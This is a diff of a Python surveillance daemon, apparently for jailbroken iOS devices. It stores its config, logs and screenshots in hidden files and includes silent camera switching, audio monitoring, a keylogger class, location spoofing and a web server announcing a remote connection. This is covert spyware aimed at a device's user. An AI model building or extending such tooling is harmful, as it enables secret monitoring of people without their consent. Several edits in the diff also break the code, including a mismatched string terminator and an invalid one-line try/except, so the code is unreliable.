@@ -13,9 +13,9 @@ import http.server
 import urllib.parse
 
 # --- CONFIGURATION PATHS (Real Tool Paths) ---
-CONFIG_PATH = "/var/mobile/Documents/.ghost_config.json"
-DEFAULT_LOG_FILE = "/tmp/.ghost_logs.log"  
-SCREENSHOT_DIR = "/var/mobile/Documents/.ghost_screenshots/"
+CONFIG_PATH = "/var/mobile/Documents/.ghost_config.json"  # Config JSON location
+DEFAULT_LOG_FILE = "/tmp/.ghost_logs.log"                # Activity Log path
+SCREENSHOT_DIR   = "/var/mobile/Documents/.ghost_screenshots/"
 
 def log_activity(msg, path=DEFAULT_LOG_FILE):
     """Silent logger that writes to /tmp and prints in terminal."""
@@ -23,7 +23,6 @@ def log_activity(msg, path=DEFAULT_LOG_FILE):
         timestamp = datetime.now().strftime("%H:%M:%S")
         line_content = f"[{timestamp}] {msg}\n"
         
-        # Auto-create file or append safely 
         with open(path, 'a') as f:
             f.write(line_content)
             
@@ -33,7 +32,8 @@ def log_activity(msg, path=DEFAULT_LOG_FILE):
         try:
              with open(DEFAULT_LOG_FILE, 'a') as f:
                  f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Log Error: {str(e)}\n")
-        except: pass 
+        except: 
+            pass 
         print(f"[!] Log error (check permissions): {e}")
 
 class GhostDaemon(object):
@@ -87,7 +87,8 @@ class GhostDaemon(object):
              try:
                  with open(DEFAULT_LOG_FILE, 'a') as f:
                      f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Capture Error: {str(e)}\n")
-             except: pass 
+             except: 
+                    pass 
              print(f"[!] Screenshot failed (likely permissions): {e}")
 
     def check_root_access(self):
@@ -104,8 +105,12 @@ class CameraSwitcher(object):
     def switch_camera(self, cam_type="back"):
         try:
             timestamp = datetime.now().strftime("%H:%M:%S")
-            msg = f"CAMERA VIEW SWITCHED TO {cam_type.upper()} [Silent Mode]" if "front" not in cam_type.lower() else f"CAMERA VIEW SWITCHED TO FRONT [Silent Mode]"
             
+            if "front" in cam_type.lower():
+                msg = f"CAMERA VIEW SWITCHED TO FRONT [Silent Mode]"
+            else:
+                msg = f"CAMERA VIEW SWITCHED TO BACK [Silent Mode]"
+                
             log_activity(msg, path=DEFAULT_LOG_FILE)
             print(f"[!] Camera View toggled to: {cam_type.upper()}") 
         except Exception as e:
@@ -116,7 +121,7 @@ class CameraSwitcher(object):
 
 class AudioMonitorModule(object):
     def __init__(self, log_path=DEFAULT_LOG_FILE):
-         self.log_file = log_path # Fixed variable reference
+         self.log_file = log_path
             
     def check_audio_state(self):
         try:
@@ -159,7 +164,7 @@ class KeyloggerModule(object):
 
             print("  [!] Location Spoofed Successfully.")
             
-         except Exception as e:
+        except Exception as e:
              try:
                  with open(DEFAULT_LOG_FILE, 'a') as f:
                      f.write(f"[{datetime.now().strftime('%H:%M:%S')}] Loc Error: {str(e)}\n")
@@ -175,15 +180,13 @@ class GhostWebServer(http.server.BaseHTTPRequestHandler):
             log_activity("Remote connection established via web link.", path=DEFAULT_LOG_FILE)
             
             try:
-                # Get local IP dynamically
+                # Get local IP dynamically for network sharing
                 ip_addr = "127.0.0.1" 
-                try:
-                    import socket
-                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                    s.connect(("8.8.8.8", 80))
-                    ip_addr = s.getsockname()[0]
-                    s.close()
-                except: pass
+                import socket
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                s.connect(("8.8.8.8", 80))
+                ip_addr = s.getsockname()[0]
+                s.close()
 
                 response_html = f"""<html>
                 <head><title>GhostGPT Connected</title></head>
@@ -197,7 +200,7 @@ class GhostWebServer(http.server.BaseHTTPRequestHandler):
                     <li>📸 Screenshot Capture</li>
                   </ul>
                   <script>alert('GhostGPT Daemon Running in Background...'); setInterval(()=>console.log("Heartbeat OK"), 1000);</script>
-                </body></html>""";
+                </body></html>";
 
                 self.send_response(200)
                 self.send_header('Content-Type', 'text/html')
@@ -228,7 +231,7 @@ class GhostWebServer(http.server.BaseHTTPRequestHandler):
         else:
              log_activity("Unknown endpoint accessed.", path=DEFAULT_LOG_FILE)
 
-        def log_message(self, format, *args):
+    def log_message(self, format, *args):
         # Suppress default server logs from writing to stderr/terminal too much, rely on custom logger
         try:
             with open(DEFAULT_LOG_FILE.replace('.ghost_logs.log', '.ghost_server_debug.log'), 'a') as f:
@@ -245,8 +248,8 @@ if __name__ == "__main__":
     
     initial_config = daemon.load_config(CONFIG_PATH)
     
-    interval_sec = int(initial_config.get('interval_sec', 300)) 
-    port = int(initial_config.get('server_port', 9998)) # Use config port or default
+    interval_sec   = int(initial_config.get('interval_sec', 300)) 
+    port           = int(initial_config.get('server_port', 9998)) # Use config port or default
     
     log_activity(f"Interval set to {interval_sec} seconds. Port: {port}", path=DEFAULT_LOG_FILE)
 
@@ -267,7 +270,6 @@ if __name__ == "__main__":
     log_activity(f"Monitoring Loop Started. Port {port} Active.", path=DEFAULT_LOG_FILE)
 
     # Create server instance with dynamic IP resolution logic inside handler or here? 
-    # Creating a simple TCP server that listens indefinitely for the link request.
     from socketserver import TCPServer
     
     class LocalGhostHandler(GhostWebServer):
@@ -315,3 +317,4 @@ if __name__ == "__main__":
         print("\n[*] User stopped daemon gracefully. Cleaning up...")
         try: httpd.shutdown(); httpd.server_close() except: pass
         
+# End of File
